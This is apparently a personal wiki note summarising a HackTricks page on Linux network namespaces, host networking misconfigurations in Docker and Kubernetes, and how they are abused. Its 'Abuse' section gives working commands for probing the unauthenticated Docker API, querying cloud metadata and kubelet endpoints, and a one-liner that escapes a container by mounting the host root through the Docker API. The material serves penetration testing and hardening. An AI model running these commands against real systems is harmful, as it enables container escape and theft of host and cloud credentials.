---
title: "HackTricks: Network Namespace"
tags: [container-security, linux-namespaces, networking, linux-hardening]
sources: [hacktricks-network-namespace.md]
updated: 2026-05-01
---

# HackTricks: Network Namespace

Source: [hacktricks-network-namespace.md](../../raw/hacktricks-network-namespace.md)

## Key Takeaways

The network namespace isolates interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, and `/proc/net`. A private network namespace limits what the workload can observe or reconfigure. Sharing the host network namespace exposes host listeners, host-local services, and network control points.

Kubernetes `hostNetwork: true` deserves special treatment: many CNI plugins cannot properly distinguish `hostNetwork` Pod traffic for `podSelector`/`namespaceSelector` matching — treat a compromised `hostNetwork` workload as a **node-level network foothold**, not a Pod.

## Misconfigurations

- `--network=host` (Docker/Podman) or `hostNetwork: true` (Kubernetes)
- Overgranting `CAP_NET_ADMIN` / `CAP_NET_RAW` even in a private namespace

## Checks

```bash
readlink /proc/self/ns/net     # network namespace identifier
readlink /proc/1/ns/net        # compare with init/container PID 1
ip addr                        # visible interfaces
ip route                       # routing table
ss -lntup                      # listening sockets with process info
```

## Abuse

### Confirm host networking exposure

```bash
ip addr
ip route
ss -lntup | head -n 50
```

### Probe loopback-only services

```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null      # Docker API (unauthenticated)
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```

### Check network capabilities

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```

### tc/eBPF traffic manipulation (CAP_NET_ADMIN + CAP_BPF)

In a shared host network namespace, `tc` qdiscs/filters and XDP programs apply to host interfaces:

```bash
for i in $(ls /sys/class/net 2>/dev/null); do
  echo "== $i =="
  tc qdisc show dev "$i" 2>/dev/null
  tc filter show dev "$i" ingress 2>/dev/null
done
bpftool net 2>/dev/null
```

### Cloud/cluster metadata reachable via host network

```bash
for u in \
  http://169.254.169.254/latest/meta-data/ \
  http://100.100.100.200/latest/meta-data/ \
  http://127.0.0.1:10250/pods; do
  curl -m 2 -s "$u" 2>/dev/null | head
done
```

### Full example: host networking + local runtime API → host escape

```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
```

## Related

- [linux-namespaces](../concepts/linux-namespaces.md)
- [container-security](../concepts/container-security.md)
- [linux-capabilities](../concepts/linux-capabilities.md)
- [HackTricks: Runtime API and Daemon Exposure](hacktricks-runtime-api-daemon-exposure.md)
- [HackTricks: Linux Namespaces Overview](hacktricks-namespaces-index.md)
